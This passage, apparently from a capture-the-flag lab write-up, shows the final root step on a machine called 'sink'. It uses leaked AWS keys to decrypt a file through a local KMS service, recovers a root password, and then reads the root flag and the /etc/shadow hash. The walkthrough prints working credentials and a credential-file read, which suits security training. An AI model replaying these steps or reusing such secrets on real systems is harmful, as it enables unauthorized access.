To decrypt we need to keys from KMS (key management service). So, we have to configure AWS one more time.

```
david@sink:~/Projects/Prod_Deployment$ aws configure
AWS Access Key ID [None]: AKIAIUEN3QWCPSTEITJQ
AWS Secret Access Key [None]: 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
Default region name [None]: eu
Default output format [None]: json
```

Now list the stored keys from KMS

```
david@sink:~/Projects/Prod_Deployment$ aws --endpoint-url="http://127.0.0.1:4566/" kms list-keys
{
    "Keys": [
        {
            "KeyId": "0b539917-5eff-45b2-9fa1-e13f0d2c42ac",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/0b539917-5eff-45b2-9fa1-e13f0d2c42ac"
        },
        {
            "KeyId": "16754494-4333-4f77-ad4c-d0b73d799939",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/16754494-4333-4f77-ad4c-d0b73d799939"
        },
        {
            "KeyId": "2378914f-ea22-47af-8b0c-8252ef09cd5f",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/2378914f-ea22-47af-8b0c-8252ef09cd5f"
        },
        {
            "KeyId": "2bf9c582-eed7-482f-bfb6-2e4e7eb88b78",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/2bf9c582-eed7-482f-bfb6-2e4e7eb88b78"
        },
        {
            "KeyId": "53bb45ef-bf96-47b2-a423-74d9b89a297a",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/53bb45ef-bf96-47b2-a423-74d9b89a297a"
        },
        {
            "KeyId": "804125db-bdf1-465a-a058-07fc87c0fad0",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/804125db-bdf1-465a-a058-07fc87c0fad0"
        },
        {
            "KeyId": "837a2f6e-e64c-45bc-a7aa-efa56a550401",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/837a2f6e-e64c-45bc-a7aa-efa56a550401"
        },
        {
            "KeyId": "881df7e3-fb6f-4c7b-9195-7f210e79e525",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/881df7e3-fb6f-4c7b-9195-7f210e79e525"
        },
        {
            "KeyId": "c5217c17-5675-42f7-a6ec-b5aa9b9dbbde",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/c5217c17-5675-42f7-a6ec-b5aa9b9dbbde"
        },
        {
            "KeyId": "f0579746-10c3-4fd1-b2ab-f312a5a0f3fc",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/f0579746-10c3-4fd1-b2ab-f312a5a0f3fc"
        },
        {
            "KeyId": "f2358fef-e813-4c59-87c8-70e50f6d4f70",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/f2358fef-e813-4c59-87c8-70e50f6d4f70"
        }
    ]
}
```

Now we have keys, let’s decrypt them.

```
david@sink:~/Projects/Prod_Deployment$ for KEY in $(aws --endpoint-url="http://127.0.0.1:4566/" kms list-keys | grep KeyId | awk -F\" '{ print $4 }'); do aws --endpoint-url="http://127.0.0.1:4566/" kms enable-key --key-id "${KEY}"; aws --endpoint-url="http://127.0.0.1:4566/" kms decrypt --key-id "${KEY}" --ciphertext-blob "fileb:///home/david/Projects/Prod_Deployment/servers.enc" --encryption-algorithm "RSAES_OAEP_SHA_256" --output "text" --query "Plaintext"; done

An error occurred (InvalidCiphertextException) when calling the Decrypt operation:

An error occurred (InvalidCiphertextException) when calling the Decrypt operation:

An error occurred (InvalidCiphertextException) when calling the Decrypt operation:

An error occurred (InvalidCiphertextException) when calling the Decrypt operation:

An error occurred (InternalFailureException) when calling the Decrypt operation (reached max retries: 4): key type not yet supported for decryption
H4sIAAAAAAAAAytOLSpLLSrWq8zNYaAVMAACMxMTMA0E6LSBkaExg6GxubmJqbmxqZkxg4GhkYGhAYOCAc1chARKi0sSixQUGIry80vwqSMkP0RBMTj+rbgUFHIyi0tS8xJTUoqsFJSUgAIF+UUlVgoWBkBmRn5xSTFIkYKCrkJyalFJsV5xZl62XkZJElSwLLE0pwQhmJKaBhIoLYaYnZeYm2qlkJiSm5kHMjixuNhKIb40tSqlNFDRNdLU0SMt1YhroINiRIJiaP4vzkynmR2E878hLP+bGALZBoaG5qamo/mfHsCgsY3JUVnT6ra3Ea8jq+qJhVuVUw32RXC+5E7RteNPdm7ff712xavQy6bsqbYZO3alZbyJ22V5nP/XtANG+iunh08t2GdR9vUKk2ON1IfdsSs864IuWBr95xPdoDtL9cA+janZtRmJyt8crn9a5V7e9aXp1BcO7bfCFyZ0v1w6a8vLAw7OG9crNK/RWukXUDTQATEKRsEoGAWjYBSMglEwCkbBKBgFo2AUjIJRMApGwSgYBaNgFIyCUTAKRsEoGAWjYBSMglEwRAEATgL7TAAoAAA=

An error occurred (InternalFailureException) when calling the Decrypt operation (reached max retries: 4): key type not yet supported for decryption

An error occurred (InternalFailureException) when calling the Decrypt operation (reached max retries: 4): key type not yet supported for decryption

An error occurred (InternalFailureException) when calling the Decrypt operation (reached max retries: 4): key type not yet supported for decryption

An error occurred (InvalidCiphertextException) when calling the Decrypt operation:

An error occurred (InternalFailureException) when calling the Decrypt operation (reached max retries: 4): key type not yet supported for decryption
```

So, we got a result in BASE64, let’s decode it using CyberChef.

[CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Gunzip()Untar()&input=SDRzSUFBQUFBQUFBQXl0T0xTcExMU3JXcTh6TllhQVZNQUFDTXhNVE1BMEU2TFNCa2FFeGc2R3h1Ym1KcWJteHFaa3hnNEdoa1lHaEFZT0NBYzFjaEFSS2kwc1NpeFFVR0lyeTgwdndxU01rUDBSQk1UaityYmdVRkhJeWkwdFM4eEpUVW9xc0ZKU1VnQUlGK1VVbFZnb1dCa0JtUm41eFNURklrWUtDcmtKeWFsRkpzVjV4Wmw2MlhrWkpFbFN3TExFMHB3UWhtSkthQmhJb0xZYVluWmVZbTJxbGtKaVNtNWtITWppeHVOaEtJYjQwdFNxbE5GRFJOZExVMFNNdDFZaHJvSU5pUklKaWFQNHZ6a3lubVIyRTg3OGhMUCtiR0FMWkJvYUc1cWFtby9tZkhzQ2dzWTNKVVZuVDZyYTNFYThqcStxSmhWdVZVdzMyUlhDKzVFN1J0ZU5QZG03ZmY3MTJ4YXZReTZic3FiWVpPM2FsWmJ5SjIyVjVuUC9YdEFORytpdW5oMDh0MkdkUjl2VUtrMk9OMUlmZHNTczg2NEl1V0JyOTV4UGRvRHRMOWNBK2phblp0Um1KeXQ4Y3JuOWE1VjdlOWFYcDFCY083YmZDRnlaMHYxdzZhOHZMQXc3T0c5Y3JOSy9SV3VrWFVEVFFBVEVLUnNFb0dBV2pZQlNNZ2xFd0NrYkJLQmdGbzJBVWpJSlJNQXBHd1NnWUJhTmdGSXlDVVRBS1JzRW9HQVdqWUJTTWdsRXdSQUVBVGdMN1RBQW9BQUE9)

We’d get root account credentials after decoding it.

```plaintext
root : _uezduQ!EY5AHfe2
```

Let’s login to root shell and read flag.

```
root@sink:~# cat root.txt
8b170092407dbbb8fcccbd739813a6bc

root@sink:~# grep -w "root" /etc/shadow
root:$6$PYtd2G7mK9kPLNkn$9kn.hmGZhQ1Am5Pyi2.o.Lt6k7ned9iHRyXIu4yg28NkHW0UTf9IaZ7NA7P5spZJK9CDIYYnW9P1najKD8ETA.:18598:0:99999:7:::
```

